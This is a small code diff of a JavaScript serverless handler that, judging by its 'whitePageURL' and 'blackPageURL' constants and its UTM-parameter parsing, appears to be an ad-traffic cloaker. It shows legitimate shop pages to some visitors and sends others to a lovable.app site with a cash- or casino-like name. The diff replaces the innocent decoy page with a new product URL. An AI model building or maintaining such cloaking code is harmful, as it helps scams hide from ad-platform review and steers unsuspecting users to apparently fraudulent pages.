@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.dutchexpatshop.com/en/hero-baby-organic-potatoes-from-6-months.html";
+    const whitePageURL = "https://www.molto.es/en/producto/unicorn-teddy-gusy-luz-by-molto/";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
